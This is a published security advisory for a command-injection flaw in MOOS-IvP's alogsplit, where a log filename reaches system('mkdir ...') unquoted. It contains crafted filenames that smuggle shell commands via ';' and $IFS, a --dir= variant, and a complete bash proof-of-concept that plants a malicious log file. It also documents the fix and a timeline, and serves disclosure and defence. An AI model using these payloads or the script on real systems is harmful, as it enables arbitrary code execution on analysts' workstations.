# MOOS-IvP: alogsplit Command Injection via Input Pathname

- **Advisory ID:** MCSAID-2026-025
- **CVE ID:** [CVE-2026-85439](https://www.cve.org/CVERecord?id=CVE-2026-85439)
- **Published:** 2026-09-02
- **Severity:** High (CVSS 7.8 – CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)
- **CVSS 4.0:** 8.5 (CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N)
- **Vulnerability type:** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **Current state:** Fixed upstream in `main` by [Pull Request #127](https://github.com/moos-ivp/moos-ivp/pull/127) (merged 2026-09-05); not yet in a tagged release (latest release is v24.8.1)
- **Software:** [MOOS-IvP](https://github.com/moos-ivp/moos-ivp)
- **CWE:** [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
- **Discovered by:** Vlatko Kosturjak of Marlink Cyber

---

## Summary

`SplitHandler` derives its cache directory name from the input log's pathname and passes it, unquoted, to `system("mkdir " + basedir)`. Shell metacharacters in a log *filename* - which travels with the log through every normal distribution channel - therefore execute as the analyst who opens it. The `--dir=` option is worse still: it has no whitespace check at all.

---

## Affected Versions

| Version | Status |
|---------|--------|
| moos-ivp <= 24.8.1 | Vulnerable |
| moos-ivp `main` from commit [`5b054c36f5a4`](https://github.com/moos-ivp/moos-ivp/commit/5b054c36f5a4a6d37b3bc0c010e42080a822d399) | Fixed |

Tested against: MOOS-IvP `1de9ae146cd63c209e8c3fd81611a4ed2472971b`, latest master.

---

## Impact

Arbitrary command execution as the operator who is analysing logs - typically a
developer or analyst workstation with credentials and access to other missions.
This triage raises the severity from medium to high: the "malicious contents
alone are insufficient" caveat is true but weak, because log *filenames* travel
with logs through every normal distribution channel (tarballs, vehicle upload
directories, shared drives, email).

---

## Exploitation

Whoever controls the *filename* of a log the operator processes, or the `--dir=` value.

Preconditions:

* The operator runs alogsplit (or alogview / another SplitHandler user) on a file whose name the attacker influenced.
* The split directory must not already exist, otherwise the mkdir sink is skipped.
* Whitespace in the filename is rejected, which is trivially avoided with `$IFS` or brace expansion.

---

## Details

### Affected code

* **`ivp/src/lib_logutils/SplitHandler.cpp`** - lines 606-608: string cmd = "mkdir " + basedir; int result = system(cmd.c_str());
* **`ivp/src/lib_logutils/SplitHandler.cpp`** - lines 580-604: handlePreCheckSplitDir(): basedir = m_alog_file with the extension replaced by "_alvtmp", or the raw --dir= value
* **`ivp/src/lib_logutils/SplitHandler.cpp`** - lines 116-140: handlePreCheckALogFile(): the only checks are the .alog suffix, no whitespace, and fopen-ability
* **`ivp/src/app_alogsplit/main.cpp`** - lines 95-122: the .alog operand and --dir= are taken from argv

### Root cause

The split directory name is derived from the input pathname and concatenated,
unquoted, into a `mkdir` command line passed to `system()`.  Shell
metacharacters in the filename are therefore executed.  The `--dir=` path is
worse: it has no whitespace check at all.

---

## Reproduction

### Test environment

Ubuntu 24.04, x86-64, gcc 13.3.0, cmake 3.28.3, FLTK 1.3.8, Python 3.14.

All four MOOS repositories were built from source with their default settings -
Release `-O2`, and every resulting binary is a hardened PIE with a stack canary,
FORTIFY, NX and full RELRO:

| Repository | Version | Built with |
| --- | --- | --- |
| core-moos | `v10.4.0-49-gec9c77c` (`ec9c77c`) | `cmake .. && make` |
| essential-moos | `10.0.1-release-22-gb897ea8` (`b897ea8`) | `cmake -DMOOS_DIR=<core-moos build> .. && make` |
| ui-moos | commit `50b9c6c` | `cmake -DBUILD_GRAPHICAL_TOOLS=ON -DBUILD_UMS=ON -DMOOS_DIR=<core-moos build> .. && make` |
| MOOS-IvP | `1de9ae146cd63c209e8c3fd81611a4ed2472971b` | `./build-moos.sh && ./build-ivp.sh` |

This is MOOS-IvP specific code. It does not exist in core-moos, essential-moos or ui-moos, so MOOS-IvP is the only affected repository.

#### Tested / reproduced

Yes - reproduced against MOOS-IvP `1de9ae146`, default production build (`./build-moos.sh && ./build-ivp.sh`).

### Steps and results

Filename `benign;id>proof.txt;echo$IFSpwned>>proof.txt;x.alog`:

    $ alogsplit 'benign;id>proof.txt;echo$IFSpwned>>proof.txt;x.alog'
    sh: 1: x_alvtmp: not found
    Possible err in SplitHandler syscmd mkdir

    proof.txt:
      uid=1001(ai) gid=1001(ai) groups=1001(ai),27(sudo),...

The `--dir=` route works too: `alogsplit clean.alog '--dir=d;id>proof2.txt;e'`
produced the same `id` output.

### Proof of concept

Standalone and self-contained - Python 3 standard library only (or a POSIX shell). It attacks an already-running production
binary and does **not** start the target itself; the launch
commands are in the header comment.

```bash
#!/bin/bash
# ============================================================================
# alogsplit / SplitHandler - command injection through a log FILENAME
#
# SplitHandler::handlePreCheckSplitDir() derives the cache-directory name from
# the input log's pathname and passes it, UNQUOTED, to
#
#     string cmd = "mkdir " + basedir;
#     int result = system(cmd.c_str());        # SplitHandler.cpp:606-608
#
# The only checks are: the name ends in ".alog", contains no whitespace, and is
# fopen()-able (SplitHandler.cpp:116-140).  Shell metacharacters are untouched,
# and the whitespace check is trivially avoided with $IFS or brace expansion.
# The --dir= option has no whitespace check at all.
#
# The attacker controls the FILENAME, which travels with a log through every
# normal distribution channel: a tarball, a vehicle upload directory, a shared
# drive, an email attachment.  The victim only has to run the stock tool on it.
#
# TARGET
# ------
# The production alogsplit binary (also reached via alogview and anything else
# that constructs a SplitHandler).
#
# HOW TO LAUNCH THE TARGET (this exploit does NOT launch anything itself)
#     Nothing to launch - the victim runs the tool.  This exploit only plants
#     the malicious log, prints the exact command the victim will run, and then
#     (with --run-as-victim) shows what happens when they do.
#
#     Build:  cd /path/to/moos-ivp && ./build-ivp.sh
#     Victim: /path/to/moos-ivp/bin/alogsplit <the planted file>
#
# USAGE
# -----
#     ./exploit.sh [outdir] [command] [--run-as-victim]
#     ./exploit.sh /tmp/drop 'id>proof.txt'
#     ./exploit.sh /tmp/drop 'id>proof.txt' --run-as-victim
#
#     The command must contain no whitespace and no '/' (a '/' would make the
#     filename a path).  Use $IFS for spaces and a relative path for output,
#     or use the --dir= variant below, which has no whitespace check.
# ============================================================================
set -u
OUT=${1:-/tmp/alogsplit-drop}
CMD=${2:-'id>proof.txt'}
RUN=${3:-}
BIN=${BIN:-/path/to/moos-ivp/bin}

mkdir -p "$OUT"
cd "$OUT"

# A structurally valid .alog file - the contents are irrelevant, only the name
# matters.
ALOG_BODY='%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% LOG FILE:       ./mission.alog
%% FILE OPENED ON  Sat Jan  1 00:00:00 2022
%% LOGSTART        1640995200.00
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
0.000  DB_TIME                pMoosDB                   1640995200
1.000  NAV_X                  pNodeReporter             10
1.000  NAV_Y                  pNodeReporter             20'

# basedir = filename with the extension replaced by "_alvtmp", so everything
# between the leading benign token and the final ".alog" ends up on the
# command line after "mkdir ".
FN="mission;${CMD};x.alog"
printf '%s\n' "$ALOG_BODY" > "$FN"

echo "[+] planted malicious log in $OUT"
printf '      %s\n' "$(printf '%q' "$FN")"
echo
echo "[+] the victim only has to run the stock tool on it:"
printf '      $ alogsplit %s\n' "$(printf '%q' "$FN")"
echo
echo "[+] SplitHandler will build and run:"
echo "      mkdir mission;${CMD};x_alvtmp"
echo "      -> 'mkdir mission' succeeds, then ';${CMD};' executes,"
echo "         then 'x_alvtmp' is reported as not found"
echo
echo "[+] second vector - the --dir= option has no whitespace check at all:"
printf '      $ alogsplit clean.alog %s\n' "$(printf '%q' "--dir=d;${CMD};e")"

if [ "$RUN" = "--run-as-victim" ]; then
  echo
  echo "=== simulating the victim ==="
  rm -f proof.txt
  "$BIN/alogsplit" "$FN" 2>&1 | sed 's/^/      /' | head -8
  echo
  if [ -s proof.txt ]; then
    echo "[+] the command ran.  $OUT/proof.txt:"
    sed 's/^/      /' proof.txt
  else
    echo "[-] no proof.txt - did the split directory already exist?"
    echo "    (an existing <name>_alvtmp directory skips the mkdir sink)"
  fi
fi

cat <<'EOT'

====================================================================
IMPACT
  Arbitrary command execution as the user analysing the logs - typically a
  developer or analyst workstation with credentials and access to other
  missions.  No MOOS process needs to be running; the victim only opens a file
  they were given.
====================================================================
EOT

```

---

## Mitigations

Fixed upstream in the `main` branch; no tagged release containing the fix exists yet.

- Pull request: [Pull Request #127](https://github.com/moos-ivp/moos-ivp/pull/127) (merged 2026-09-05)
- Fix commit: [5b054c36f5a4](https://github.com/moos-ivp/moos-ivp/commit/5b054c36f5a4a6d37b3bc0c010e42080a822d399)

### Recommended fix

Delete the `system()` call: use `std::filesystem::create_directories(basedir)`
(or `mkdir()` plus `errno`) and treat the path as opaque filesystem data.  There
is no reason for a shell to be involved.  This is a two-line change.

---

## Recommendations

- Upgrade to a moos-ivp release that includes commit [`5b054c36f5a4`](https://github.com/moos-ivp/moos-ivp/commit/5b054c36f5a4a6d37b3bc0c010e42080a822d399) once available, or build from `main` at or after that commit.
- Do not process alog files or pathnames from untrusted sources with the affected tools.

---

## Timeline

- 2026-09-02 – CVE-2026-85439 published
- 2026-09-05 – Fix merged upstream in [Pull Request #127](https://github.com/moos-ivp/moos-ivp/pull/127)
- 2026-10-13 – Marlink Cyber advisory released

---

## References

- CVE record: [CVE-2026-85439](https://www.cve.org/CVERecord?id=CVE-2026-85439)
- VulnCheck advisory: [MOOS-IvP through 24.8.1 alogsplit Command Injection via Input Pathname](https://www.vulncheck.com/advisories/moos-ivp-through-24.8.1-alogsplit-command-injection-via-input-pathname)
- Upstream pull request: [Pull Request #127](https://github.com/moos-ivp/moos-ivp/pull/127)
- Fix commit (PR head): [f684d77d9d6e9e96dbfce46f05988d5a643f2b60](https://github.com/moos-ivp/moos-ivp/commit/f684d77d9d6e9e96dbfce46f05988d5a643f2b60)
- Marlink Cyber Security Advisory: [MCSAID-2026-025](https://github.com/marlinkcyber/advisories/blob/main/advisories/MCSAID-2026-025-moos-ivp-alogsplit-command-injection-via-input-pathname.md)
- Merge commit: [5b054c36f5a4a6d37b3bc0c010e42080a822d399](https://github.com/moos-ivp/moos-ivp/commit/5b054c36f5a4a6d37b3bc0c010e42080a822d399)
- Software: [MOOS-IvP](https://github.com/moos-ivp/moos-ivp)
